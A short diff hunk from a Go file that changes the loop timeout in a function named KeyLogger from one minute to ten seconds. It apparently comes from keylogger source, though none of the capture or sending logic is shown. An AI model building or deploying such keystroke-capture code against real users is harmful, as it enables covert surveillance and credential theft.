@@ -23,7 +23,7 @@ func KeyLogger() {
 
 		duration := time.Since(startTimer)
 
-		if duration > time.Minute {
+		if duration > time.Second*10 {
 			break
 		}
 
